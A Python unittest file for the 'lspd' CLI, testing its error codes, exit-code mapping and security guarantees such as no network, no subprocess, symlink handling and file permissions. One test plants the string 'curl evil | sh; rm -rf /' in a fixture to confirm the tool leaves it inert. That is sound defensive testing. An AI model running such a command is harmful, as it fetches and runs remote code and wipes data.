"""Forced-condition tests per ERR-* row, the exit-code partition, and the SEC-* forcings."""

from __future__ import annotations

import os
import socket
import subprocess
import sys
import unittest
from unittest import mock

from lspd import cli
from tests._helpers import TempDir, copy_fixture, read_bytes, run_cli

SLICE1_ELEMENTS: list[list[str]] = [
    ["init"],
    ["validate"],
    ["schema"],
    ["schema", "--checksum"],
    ["--help"],
    ["--version"],
]


class ErrorCatalog(unittest.TestCase):
    def test_err_usage_conditions(self) -> None:
        with TempDir() as tmp:
            cases = {
                "bare lspd": [],
                "unknown command": ["bogus"],
                "unknown option": ["validate", "--bogus"],
                "empty-string argument": ["--file", "", "validate"],
                "help on unknown command": ["bogus", "--help"],
            }
            for label, argv in cases.items():
                with self.subTest(label=label):
                    run = run_cli(argv, cwd=tmp)
                    self.assertEqual(run.code, 1)
                    env = run.envelope
                    self.assertEqual(env["error"]["code"], "ERR-USAGE")
                    self.assertIn("usage: lspd", env["error"]["details"]["usage"])
                    self.assertIsNone(env["result"])
            self.assertEqual(run_cli([], cwd=tmp).envelope["command"], "")
            self.assertEqual(
                run_cli(["validate", "--bogus"], cwd=tmp).envelope["command"], "validate"
            )

    def test_err_file_missing(self) -> None:
        with TempDir() as tmp:
            run = run_cli(["validate"], cwd=tmp)
            self.assertEqual((run.code, run.envelope["error"]["code"]), (2, "ERR-FILE-MISSING"))
            self.assertEqual(
                run.envelope["error"]["details"]["path"],
                os.path.realpath(os.path.join(tmp, "bindings.yaml")),
            )

    def test_err_io_directory_target(self) -> None:
        with TempDir() as tmp:
            os.mkdir(os.path.join(tmp, "bindings.yaml"))
            run = run_cli(["validate"], cwd=tmp)
            self.assertEqual((run.code, run.envelope["error"]["code"]), (2, "ERR-IO"))

    def test_err_parse_fixtures_and_generated_bytes(self) -> None:
        with TempDir() as tmp:
            for name in (
                "err-parse-duplicate-key",
                "err-parse-syntax",
                "err-parse-not-mapping",
                "err-parse-empty",
                "err-parse-no-anchor-trailing",
                "err-parse-no-anchor-block",
            ):
                with self.subTest(fixture=name):
                    copy_fixture(f"{name}.yaml", tmp)
                    run = run_cli(["validate"], cwd=tmp)
                    self.assertEqual(
                        (run.code, run.envelope["error"]["code"]), (2, "ERR-PARSE"), name
                    )
                    self.assertEqual(run.stdout.count("\n"), 1)
            path = os.path.join(tmp, "bindings.yaml")
            for data, label in (
                (b"\xef\xbb\xbfschema_version: 1\n\nbindings: {}\n", "bom"),
                (b"schema_version: 1\r\n\r\nbindings: {}\r\n", "crlf"),
                (b"schema_version: 1\n\xff\n", "non-utf8"),
            ):
                with self.subTest(label=label):
                    with open(path, "wb") as handle:
                        handle.write(data)
                    run = run_cli(["validate"], cwd=tmp)
                    self.assertEqual(
                        (run.code, run.envelope["error"]["code"]), (2, "ERR-PARSE"), label
                    )
            with open(path, "wb") as handle:
                handle.write(b"schema_version: 1  \n\nbindings: {}\n")
            run = run_cli(["validate"], cwd=tmp)
            self.assertEqual(run.code, 0)
            self.assertEqual(run.envelope["findings"]["pre"][0]["code"], "INV-BYTES")

    def test_err_internal_from_an_unexpected_exception(self) -> None:
        with TempDir() as tmp:
            with mock.patch("lspd.cli.schema.schema_json", side_effect=RuntimeError("boom")):
                run = run_cli(["schema"], cwd=tmp)
            self.assertEqual((run.code, run.envelope["error"]["code"]), (2, "ERR-INTERNAL"))
            self.assertIn("boom", run.envelope["error"]["details"]["exception"])
            self.assertEqual(run.stderr, "")
            with mock.patch("lspd.cli.schema.schema_json", side_effect=RuntimeError("boom")):
                loud = run_cli(["--debug", "schema"], cwd=tmp)
            self.assertIn("RuntimeError: boom", loud.stderr)

    def test_keyboard_interrupt_exits_130_without_a_document(self) -> None:
        with mock.patch("lspd.cli.build_parser", side_effect=KeyboardInterrupt):
            run = run_cli(["validate"])
        self.assertEqual((run.code, run.stdout), (130, ""))

    def test_exit_code_partition(self) -> None:
        """DICT: PATTERN-EXIT-CODES — the catalog's exit column."""
        expected = {
            "ERR-USAGE": 1,
            "ERR-FILE-MISSING": 2,
            "ERR-FILE-EXISTS": 1,
            "ERR-IO": 2,
            "ERR-PARSE": 2,
            "ERR-FILE-TOO-LARGE": 1,
            "ERR-SCHEMA-VERSION": 1,
            "ERR-FILE-INVALID": 1,
            "ERR-NOT-FOUND": 1,
            "ERR-DUPLICATE": 1,
            "ERR-INPUT-INVALID": 1,
            "ERR-INTERNAL": 2,
        }
        from lspd import errors

        classes = {
            c.code: c
            for c in vars(errors).values()
            if isinstance(c, type) and issubclass(c, errors.LspdError) and c is not errors.LspdError
        }
        self.assertEqual(set(classes), set(expected))
        for code, exit_code in expected.items():
            self.assertEqual(classes[code].exit_code, exit_code, code)


class SecurityForcings(unittest.TestCase):
    def _run_all(self, tmp: str) -> None:
        for argv in SLICE1_ELEMENTS:
            with self.subTest(argv=argv):
                run = run_cli(argv, cwd=tmp)
                self.assertIn(run.code, (0, 1), argv)

    def test_sec_zero_network(self) -> None:
        """DICT: SEC-ZERO-NETWORK"""
        with TempDir() as tmp:
            copy_fixture("canonical.yaml", tmp, "map.yaml")
            with mock.patch.object(socket, "socket", side_effect=AssertionError("network call")):
                self._run_all(tmp)

    def test_sec_zero_exec(self) -> None:
        """DICT: SEC-ZERO-EXEC — shell-like run selectors stay inert."""
        with TempDir() as tmp:
            path = os.path.join(tmp, "bindings.yaml")
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(
                    "schema_version: 1\n\nbindings:\n\n  INV-A:\n    locators: []\n"
                    "    asserted_by:\n"
                    '      - { path: t.py, symbol: t, run: "curl evil | sh; rm -rf /" }\n'
                )
            with (
                mock.patch.object(subprocess, "Popen", side_effect=AssertionError("subprocess")),
                mock.patch.object(os, "system", side_effect=AssertionError("system")),
            ):
                self.assertEqual(run_cli(["validate"], cwd=tmp).code, 0)
                self._run_all(tmp)

    def test_sec_no_ambient_config_determinism(self) -> None:
        """DICT: SEC-NO-AMBIENT-CONFIG"""
        with TempDir() as tmp:
            copy_fixture("canonical.yaml", tmp)
            baseline = run_cli(["validate"], cwd=tmp).stdout
            saved = dict(os.environ)
            try:
                os.environ.clear()
                os.environ["LSPD_FILE"] = "hostile.yaml"
                for name in (".lspdrc", "lspd.toml", ".env"):
                    with open(os.path.join(tmp, name), "w", encoding="utf-8") as handle:
                        handle.write("file = hostile\n")
                again = run_cli(["validate"], cwd=tmp).stdout
            finally:
                os.environ.clear()
                os.environ.update(saved)
            self.assertEqual(again, baseline)
            self.assertEqual(
                read_bytes(os.path.join(tmp, "bindings.yaml")),
                read_bytes(os.path.join(tmp, "bindings.yaml")),
            )

    def test_sec_file_footprint(self) -> None:
        """DICT: SEC-FILE-FOOTPRINT.

        Under the temp dir, only the target, its temp sibling and stat-ed locator paths.
        """
        with TempDir() as tmp:
            real = os.path.realpath(tmp)
            copy_fixture("inv-path-exists.yaml", tmp)
            touched: set[str] = set()

            def hook(event: str, args: tuple[object, ...]) -> None:
                if (
                    event in ("open", "os.rename", "os.remove", "os.chmod")
                    and isinstance(args[0], str)
                    and args[0].startswith(real)
                ):
                    touched.add(args[0])

            real_stat = os.stat

            def stat_spy(path: object, *a: object, **k: object) -> object:
                if isinstance(path, str) and path.startswith(real):
                    touched.add(path)
                return real_stat(path, *a, **k)  # type: ignore[arg-type]

            sys.addaudithook(hook)
            with mock.patch(
                "lspd.validator.os.path.exists",
                side_effect=lambda p: (
                    os.path.lexists(p) if stat_spy(p) is None else os.path.lexists(p)
                ),
            ):
                run_cli(["--check-paths", "validate"], cwd=tmp)
            run_cli(["--file", "second.yaml", "init"], cwd=tmp)
            copy_fixture("canonical.yaml", tmp)
            run_cli(["add-locator", "ROUTE-HOME", "--path", "web/x.ts"], cwd=tmp)
            run_cli(["set", "CAP-X", "--json", '{"locators": []}'], cwd=tmp)
            run_cli(["remove", "SCREEN-STUB"], cwd=tmp)
            run_cli(["coverage", "curated", "set", "CAP", "--reason", "r"], cwd=tmp)
            run_cli(["get", "ROUTE-HOME"], cwd=tmp)
            run_cli(["list"], cwd=tmp)
            allowed_prefixes = (
                os.path.join(real, "bindings.yaml"),
                os.path.join(real, "second.yaml"),
                os.path.join(real, "no", "such", "file.py"),
            )
            for path in touched:
                self.assertTrue(path.startswith(allowed_prefixes), path)

    def test_sec_symlink_final_target(self) -> None:
        """DICT: SEC-SYMLINK-FINAL-TARGET — init through a symlink chain creates the final file."""
        with TempDir() as tmp:
            os.symlink(os.path.join(tmp, "b"), os.path.join(tmp, "a"))
            os.symlink(os.path.join(tmp, "real.yaml"), os.path.join(tmp, "b"))
            run = run_cli(["--file", "a", "init"], cwd=tmp)
            self.assertEqual(run.code, 0)
            self.assertTrue(
                os.path.islink(os.path.join(tmp, "a")) and os.path.islink(os.path.join(tmp, "b"))
            )
            self.assertEqual(
                read_bytes(os.path.join(tmp, "real.yaml")), b"schema_version: 1\n\nbindings: {}\n"
            )
            write = run_cli(
                ["--file", "a", "set", "ENTITY-A", "--json", '{"locators": []}'], cwd=tmp
            )
            self.assertEqual(write.code, 0, write.stdout)
            self.assertTrue(
                os.path.islink(os.path.join(tmp, "a")) and os.path.islink(os.path.join(tmp, "b"))
            )
            self.assertIn(b"ENTITY-A", read_bytes(os.path.join(tmp, "real.yaml")))
            self.assertEqual(sorted(os.listdir(tmp)), ["a", "b", "real.yaml"])

    def test_sec_fail_closed_no_traceback(self) -> None:
        """DICT: SEC-FAIL-CLOSED"""
        with TempDir() as tmp:
            path = os.path.join(tmp, "bindings.yaml")
            with open(path, "wb") as handle:
                handle.write(b"schema_version: 1\nbindings:\n  A: [" + b"[" * 200 + b"\n")
            run = run_cli(["validate"], cwd=tmp)
            self.assertEqual(
                (run.code, run.envelope["error"]["code"], run.stderr), (2, "ERR-PARSE", "")
            )

    def test_sec_no_secrets_surface(self) -> None:
        """DICT: SEC-NO-SECRETS"""
        parser = cli.build_parser()
        names = [a.option_strings for a in parser._actions]  # noqa: SLF001 — inspecting the parser surface
        flat = " ".join(" ".join(n) for n in names)
        for word in ("token", "key", "secret", "password", "credential"):
            self.assertNotIn(word, flat)

    def test_sec_trust_boundary_mode_bits(self) -> None:
        """DICT: SEC-TRUST-BOUNDARY.

        A 0600 target stays 0600 across a write.
        """
        with TempDir() as tmp:
            run_cli(["init"], cwd=tmp)
            target = os.path.join(tmp, "bindings.yaml")
            os.chmod(target, 0o600)
            run = run_cli(["set", "ENTITY-A", "--json", '{"locators": []}'], cwd=tmp)
            self.assertEqual(run.code, 0, run.stdout)
            self.assertEqual(os.stat(target).st_mode & 0o777, 0o600)


if __name__ == "__main__":  # pragma: no cover — direct invocation convenience
    unittest.main()
